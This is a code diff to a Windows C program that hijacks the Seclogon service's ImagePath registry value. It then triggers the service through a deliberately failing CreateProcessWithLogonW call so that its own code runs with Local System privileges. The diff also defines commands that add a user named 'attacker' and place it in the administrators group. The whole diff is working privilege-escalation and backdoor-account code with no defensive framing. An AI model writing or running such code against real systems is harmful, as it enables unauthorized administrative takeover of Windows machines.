@@ -27,6 +27,10 @@
 #define SECLOGON_IMAGE_PATH_NAME L"ImagePath"
 #define SECLOGON_IMAGE_PATH      L"%windir%\\system32\\svchost.exe -k netsvcs -p"
 
+#define FAKE_USER_CMD  L"cmd.exe"
+#define FAKE_USER_NAME L"FakeUser"
+#define FAKE_USER_PASS L"Password"
+
 #define COMMAND_1 L"cmd /c net user /add attacker password123"
 #define COMMAND_2 L"cmd /c net localgroup administrators attacker /add"
 
@@ -81,13 +85,9 @@ static STATUS SetSelfAsRegKey();
 static STATUS ResetRegKey();
 
 /**
-    @brief  Starts the Seclogon service, which will execute the code at the
-ImagePath registry value we set in SetSelfAsRegKey. This will run our executable
-            with Local System privileges.
-    @retval  - STATUS_SUCCESS on success
-             - STATUS_ERR_GENERIC on failure
+    @brief  Triggers seclogon service by calling CreateProcessWithLogonW().
 **/
-static STATUS StartSecLogonService();
+static VOID TriggerSecLogon();
 
 // ############################## Fn Definitions ##############################
 
@@ -145,11 +145,10 @@ wmain (INT iArgc, PWCHAR *ppArgv)
             goto EXIT;
         }
 
-        Status = StartSecLogonService();
-        if (STATUS_SUCCESS != Status)
-        {
-            PRINT_ERROR("StartSecLogonService failed");
-        }
+        wprintf(
+            L"Registry key set successfully. Attempting to trigger Seclogon "
+            L"service to execute code with Local System privileges...\n");
+        TriggerSecLogon();
     }
 
     Status = STATUS_SUCCESS;
@@ -338,47 +337,41 @@ EXIT:
     return Status;
 } // ResetRegKey
 
-static STATUS
-StartSecLogonService ()
+static VOID
+TriggerSecLogon ()
 {
-    STATUS    Status       = STATUS_ERR_GENERIC;
-    SC_HANDLE schSCManager = NULL;
-    SC_HANDLE schService   = NULL;
-    BOOL      bStatus      = FALSE;
+    STARTUPINFOW        si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+    si.cb                  = sizeof(STARTUPINFOW);
 
-    schSCManager = OpenSCManagerW(NULL, NULL, SERVICE_START);
-    if (NULL == schSCManager)
+#pragma warning(push)
+#pragma warning(disable : 6031)
+    // We aren't checking the status of this CreateProcessWithLogonW
+    // call because it will fail due to the invalid user. The Seclogon
+    // service is still triggered, which is the point of this API call.
+    // Process information for CreateProcessWithLogonW
+    CreateProcessWithLogonW(
+        FAKE_USER_NAME,     // Username
+        NULL,               // Domain (NULL for local account)
+        FAKE_USER_PASS,     // Password
+        LOGON_WITH_PROFILE, // Logon flags
+        FAKE_USER_CMD,      // Application name (NULL to use command line)
+        FAKE_USER_CMD,      // Command line
+        CREATE_NO_WINDOW,   // Creation flags
+        NULL,               // Environment (NULL to use current environment)
+        NULL,               // Current directory (NULL to use current directory)
+        &si,                // Startup info
+        &pi);               // Process information
+#pragma warning(pop)
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    if (NULL != pi.hProcess)
     {
-        PRINT_ERROR("Failed to open SCM.");
-        goto EXIT;
+        CloseHandle(pi.hProcess);
     }
-
-    schService
-        = OpenServiceW(schSCManager, SECLOGON_SERVICE_NAME, SERVICE_START);
-    if (NULL == schService)
+    if (NULL != pi.hThread)
     {
-        PRINT_ERROR("Failed to open seclogon service.");
-        goto EXIT;
+        CloseHandle(pi.hThread);
     }
-
-    bStatus = StartServiceW(schService, 0, NULL);
-    if (FALSE == bStatus)
-    {
-        PRINT_ERROR("Failed to start seclogon service.");
-        goto EXIT;
-    }
-
-    Status = STATUS_SUCCESS;
-EXIT:
-    if (NULL != schService)
-    {
-        CloseServiceHandle(schService);
-    }
-    if (NULL != schSCManager)
-    {
-        CloseServiceHandle(schSCManager);
-    }
-    return Status;
-} // StartSecLogonService
+} // TriggerSecLogon
 
 // End of file
